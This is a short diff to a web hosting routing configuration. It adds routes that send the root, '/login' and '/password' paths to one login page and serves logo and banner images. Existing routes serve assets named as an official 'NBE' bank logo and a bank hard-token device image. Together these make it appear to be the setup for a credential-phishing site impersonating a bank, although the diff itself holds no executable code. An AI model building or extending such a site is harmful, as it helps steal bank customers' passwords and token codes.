@@ -11,6 +11,15 @@
     }
   ],
   "routes": [
+    { "src": "^/$", "dest": "/public/login.html" },
+    { "src": "^/login$", "dest": "/public/login.html" },
+    { "src": "^/password$", "dest": "/public/login.html" },
+    { "src": "/logo\\.svg", "dest": "/public/logo.svg" },
+    { "src": "/logo-icon\\.svg", "dest": "/public/logo-icon.svg" },
+    { "src": "/logo\\.jpg", "dest": "/public/logo.jpg" },
+    { "src": "/banner1\\.jpg", "dest": "/public/banner1.jpg" },
+    { "src": "/banner2\\.jpg", "dest": "/public/banner2.jpg" },
+    { "src": "/banner3\\.jpg", "dest": "/public/banner3.jpg" },
     { "src": "/assets/(.*)", "dest": "/public/assets/$1" },
     { "src": "/manus-storage/nbe-official-logo_7734b82a.png", "dest": "/public/manus-storage/nbe-official-logo_7734b82a.png", "headers": { "Content-Type": "image/png" } },
     { "src": "/manus-storage/nbe-hard-token-device_9092db02.png", "dest": "/public/manus-storage/nbe-hard-token-device_9092db02.jpg", "headers": { "Content-Type": "image/jpeg" } },
